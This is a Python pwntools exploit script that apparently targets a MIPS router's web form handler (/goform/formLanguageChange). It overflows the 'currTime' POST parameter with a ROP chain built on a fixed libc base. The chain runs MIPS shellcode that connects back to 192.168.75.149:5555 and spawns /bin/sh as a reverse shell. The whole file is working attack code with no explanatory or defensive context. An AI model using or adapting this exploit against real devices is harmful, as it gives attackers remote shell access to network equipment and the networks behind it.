import requests
import sys
import struct
from pwn import *
#context.log_level='debug'
context.arch='mips'
context.endian='big'
ip='192.168.75.150'

def syscmd1(a):
    p=remote(ip,80)
    z=len(a)
    print "[+]len:"+str(z)
    payload=''
    payload+='POST /goform/formLanguageChange HTTP/1.1\r\n'
    payload+='Host: '+ip+'\r\n'
    payload+='Connection: keep-alive\r\n'
    payload+='Accept-Encoding: gzip, deflate\r\n'
    payload+='Accept: */*\r\n'
    payload+='User-Agent: python-requests/2.18.4\r\n'
    payload+='Content-Length: '+str(z+9)+'\r\n'
    payload+='Content-Type: application/x-www-form-urlencoded\r\n'
    payload+='\r\n'
    payload+='currTime='
    payload+=a+'\r\n'
    p.send(payload)
    p.recvuntil('</html>')
    #raw_input()
    p.close()

#base address of libc.so.0
base1=0x2ab88000
###shellcode
sc=struct.pack(">I",0x24060101)
sc+=struct.pack(">I",0x04d0ffff)
sc+=struct.pack(">I",0x2806ffff)
sc+=struct.pack(">I",0x27bdffe0)
sc+=struct.pack(">I",0x27e41001)
sc+=struct.pack(">I",0x2484f023)
sc+=struct.pack(">I",0xafa4ffe8)
sc+=struct.pack(">I",0xafa0ffec)
sc+=struct.pack(">I",0x27a5ffe8)
sc+=struct.pack(">I",0x24020fab)
sc+=struct.pack(">I",0xafa00108)
sc+=struct.pack(">I",0x0101010c)
sc+="/bin//sh\x00"

shellcode =''
shellcode += asm(shellcraft.connect('192.168.75.149',5555))
shellcode += asm(shellcraft.dup2(5,0))
shellcode += asm(shellcraft.dup2(5,1))
shellcode += sc

s0=struct.pack(">I",base1+0x2C794)
s1=struct.pack(">I",base1+0x2C794)### rop2:move $t9,$s2;...;jr $t9 
s2=struct.pack(">I",base1+0x24b70)### rop3:sleep(1)
s3=struct.pack(">I",base1+0x2bdac)### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ra
s4=struct.pack(">I",base1+0x2bdac)
###rop
payload1='a'*0x167+s0+s1+s2+s3
payload1+=struct.pack(">I",base1+0x25714)  ###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2
payload1+='b'*0x1c+s0+s1+s2+s3+s4
payload1+=struct.pack(">I",base1+0x5f98)  ###rop4:lw $ra,0x1c($sp);...;jr $ra
payload1+='c'*0x1c
payload1+=s3
payload1+='d'*0x18
payload1+=struct.pack(">I",0x24910101) ###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",0x0220c821)
payload1+=struct.pack(">I",0x0320f809)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",0x2231feff)
payload1+=struct.pack(">I",base1+0x2bda0) ###rop6:mov $t9,$a0;...;jalr $t9
payload1+='e'*0x20+shellcode
if __name__ == "__main__":
    syscmd1(payload1)